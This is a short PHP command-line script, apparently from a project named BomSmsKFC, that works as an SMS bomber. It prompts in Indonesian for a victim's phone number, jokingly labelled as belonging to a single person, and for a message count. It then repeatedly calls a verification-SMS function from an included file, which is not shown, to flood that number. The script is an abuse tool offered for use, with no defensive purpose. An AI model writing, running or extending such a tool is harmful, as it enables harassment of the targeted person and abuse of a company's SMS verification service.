<?php
include 'bomkfc.php';

/*
    https://github.com/nee48/BomSmsKFC
    Made by Handika Pratama
    Modified by まやちゃん
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor Org Yg Jomblo\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan Untuk Jomblo\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}

